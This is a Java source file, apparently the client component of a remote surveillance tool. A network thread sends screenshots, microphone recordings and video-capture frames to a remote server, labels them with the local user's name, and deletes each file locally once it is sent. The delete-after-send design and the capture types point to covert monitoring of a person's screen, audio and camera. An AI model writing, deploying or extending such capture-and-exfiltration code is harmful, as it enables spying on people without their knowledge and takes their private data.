package application.network;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;

public class NetworkThread implements Runnable  {
	private String type;
	private Socket socket;
	private ObjectOutputStream objectOutputStream;
	
	public NetworkThread(String type, Socket socket) {
		this.type = type;
		this.socket = socket;
	}
	
	private void sendFile(String fileName) {
		try {
			BufferedInputStream bufferedInputStream = new BufferedInputStream(new FileInputStream(fileName));

			byte[] bytes = new byte[16*1024];
			int length, offset = 0;
			
	        while ((length = bufferedInputStream.read(bytes)) > offset) {
	            sendFileToServer(bytes, offset, length);
	        }
	        
	        String path = Paths.get(".").toAbsolutePath().normalize().toString();
	        
	        if (path.contains("/")) {
	        	new File(path+"/"+(fileName)).delete();
			}
			else if (path.contains(Character.toString('\\'))) {
				File file = new File(path+Character.toString('\\')+fileName);
				
				Files.delete(file.toPath());
			}
	        
	        bytes = null;
			bufferedInputStream.close();
//			System.out.println("Finish sending file to server");
		}
		catch (FileNotFoundException exception) {
			System.out.println("File was not found");
		}
		catch(IOException exception) {
			System.out.println("error when reading from file or stream");
			exception.printStackTrace();
		}
	}
	
	private void sendFileToServer(byte [] bytes, int offset, int length) {
		try {
			this.objectOutputStream.write(bytes, offset, length);
			this.objectOutputStream.flush();
		}
		catch (IOException exception) {
			System.out.println("Error sending file");
		}
	}
	
    private String getCurrentDateAndTimeFormat(boolean param) { 
    	DateFormat dateFormat = new SimpleDateFormat();
        java.util.Date date = new java.util.Date();

        String dateAndTime = dateFormat.format(date).toString();

        String amPm = dateAndTime.substring(dateAndTime.length() - 3);
        dateAndTime = dateAndTime.substring(0, dateAndTime.length() - 3) +":"+ Calendar.getInstance().get(Calendar.SECOND);
        dateAndTime += amPm;

        String month = "", day = "", year = "";
        String newDate = "", time = "";

        int slashCount = 0, formatCounter = 0;

        for(int index = 0; index < dateAndTime.length(); index++) {
            if((dateAndTime.charAt(index) == '/') && (slashCount == 0))  {
                month = dateAndTime.substring(0, index);
                slashCount++;
                formatCounter = index+1;
            }
            else if((dateAndTime.charAt(index) == '/') && (slashCount == 1))  {
                day = dateAndTime.substring(formatCounter, index);
                formatCounter = index+1;
            }
            else if(dateAndTime.charAt(index) == ' ')  {
                year = dateAndTime.substring(formatCounter, index);

                for(int count = index; count < dateAndTime.length(); count++) {
                    if(dateAndTime.charAt(count) == ':') {
                        time += ".";
                    }
                    else if(param == true) {
                        if(Character.isLetter(dateAndTime.charAt(count)) || (Character.isDigit(dateAndTime.charAt(count)))) {
                            time += dateAndTime.charAt(count);
                        }
                    }
                    else if(param == false) {
                        time += dateAndTime.charAt(count);
                    }
                }

                break;
            }
        }

        newDate = month+" "+day+", "+"20"+year;

        return newDate.concat(param==true?"-":" ").concat(time.replace(".", ":"));
    }
	
	public void run() {
		try {
			this.objectOutputStream = new ObjectOutputStream(this.socket.getOutputStream());
			
			if (this.type.contains("SCREENSHOT!")) {
				this.objectOutputStream.writeObject("SCREENSHOT!");
				Thread.sleep(1000);
				this.objectOutputStream.writeObject("ScreenShot-"+System.getProperty("user.home").replace("/Users/", "").replace("C:\\Users\\", "")+"-"+(this.getCurrentDateAndTimeFormat(false))+".jpg");
				
				this.sendFile("ScreenShot"+(type.substring(11))+".jpg");
			}
			else if (type.contains("AUDIO!")) {
				this.objectOutputStream.writeObject("AUDIO!");
				this.objectOutputStream.writeObject("Recording-"+System.getProperty("user.home").replace("/Users/", "").replace("C:\\Users\\", "")+"-"+type.substring(6)+".wav");
				
				this.sendFile("Recording-"+type.substring(6)+".wav");
			}
			else if (type.contains("VIDEOCAPTURE!")) {
				String indexes[] = type.substring(13).split("-");
				
				for (int index = Integer.parseInt(indexes[0]); index < Integer.parseInt(indexes[1]); index++) {
					this.objectOutputStream.writeObject("VIDEOCAPTURE!");
					this.objectOutputStream.writeObject("Capture-"+System.getProperty("user.home").replace("/Users/", "").replace("C:\\Users\\", "")+Integer.toString(index)+".png");
					
					this.sendFile("VideoCapture"+(index)+".png");
				}
			}
			
			this.objectOutputStream.writeObject("END");
			
//			System.out.println("End of Client Thread");
			this.objectOutputStream.close();
			this.socket.close();
		}
		catch(IOException exception) {
			System.out.println("Error from socket");
//			exception.printStackTrace();
		}
		catch(Exception exception) {
			System.out.println("Unknown error");
//			exception.printStackTrace();
		}
	}
}